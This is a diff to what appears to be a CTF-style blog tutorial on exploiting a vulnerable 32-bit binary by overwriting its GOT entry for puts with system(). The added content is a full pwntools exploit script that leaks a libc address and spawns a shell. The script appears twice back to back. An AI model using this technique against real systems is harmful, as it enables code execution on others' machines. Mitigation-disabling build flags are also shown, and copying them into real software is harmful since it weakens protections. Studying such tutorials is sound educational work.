@@ -15,6 +15,8 @@ Modern Linux relies on a linker to match imported symbols to an external library
 
 We are given the source code to a vulnerable binary, and need to exploit it in order to gain code execution by spawning a shell.  Because we are leveraging an information leak (ASLR bypass) for this vulnerability, we do not need to include it but it can easily be reproduced.
 
+{{< details "**Expand full source for got.c**" >}}
+
 ```c {linenos=table}
 // got.c
 #include <stdlib.h>
@@ -55,6 +57,8 @@ int main() {
 }
 ```
 
+{{< /details >}}
+
 To compile the binary, we need to use `clang`.  In this case, it is preferred over GCC since recent Ubuntu versions of GCC do not respect `-fno-pie`.  We also want a 32-bit binary, so we specify `-m32`.  The flag `-Wl,-z,norelro` is sent to the linker, in order to disable the RELRO feature (a security mitigation to prevent GOT overwrite attacks).
 
 ```shell
@@ -86,6 +90,90 @@ Finally, we call `puts(student.name)`.  Our goal is to hijack the GOT entry for 
 ## Exploit Script
 
 Our exploit script starts by importing Pwntools, and setting `context.binary` which informs the rest of pwntools what architecture should be used by default.  This is important for challenges which are for 64-bit binaries, or generate assembly, but we do it here just for convenience.
+
+The whole exploit script can be seen by expanding the details below, but it is broken up for the sake of discussing it throughout the rest of this post.
+
+{{< details "**Expand full source for exploit.py**" >}}
+
+```python {linenos=table}
+from pwn import *
+
+context.binary = e = ELF('got')
+
+print("puts@got is at ", hex(e.got.puts))
+
+# Start the process
+io = e.process()
+io.clean()
+
+# We have 28 bytes, and 4 of them will be dumped
+io.fit({
+    0: '/bin/sh\x00',
+    24: e.got.puts
+})
+
+# Receive data until we get the open colon
+io.recvuntil(b"(")
+
+# Receive exactly four bytes of leaked data
+got_puts = io.unpack()
+info("puts@GOT == %#x" % got_puts)
+io.clean()
+
+# Calculate the base address of libc so we can calculate system()
+libc = context.binary.libc
+libc.address = got_puts - libc.symbols.puts
+info("libc == %#x", libc.address)
+
+# Calculate system()
+system = libc.symbols.system
+io.pack(system)
+
+# Get a shell
+io.clean()
+io.sendline('cat flag.txt')
+success(io.clean())
+from pwn import *
+
+context.binary = e = ELF('got')
+
+print("puts@got is at ", hex(e.got.puts))
+
+# Start the process
+io = e.process()
+io.clean()
+
+# We have 28 bytes, and 4 of them will be dumped
+io.fit({
+	0: '/bin/sh\x00',
+	24: e.got.puts
+})
+
+# Receive data until we get the open colon
+io.recvuntil(b"(")
+
+# Receive exactly four bytes of leaked data
+got_puts = io.unpack()
+info("puts@GOT == %#x" % got_puts)
+io.clean()
+
+# Calculate the base address of libc so we can calculate system()
+libc = context.binary.libc
+libc.address = got_puts - libc.symbols.puts
+info("libc == %#x", libc.address)
+
+# Calculate system()
+system = libc.symbols.system
+io.pack(system)
+
+# Get a shell
+io.clean()
+io.sendline('cat flag.txt')
+success(io.clean())
+
+```
+
+{{< /details >}}
 
 Next the script starts the target process, and clears any existing output.  Since the binary is not position-independent (does not use ASLR), the *location* of the `puts` pointer is known ahead of time, and can be automatically calculated by using `ELF.got.puts`.
 
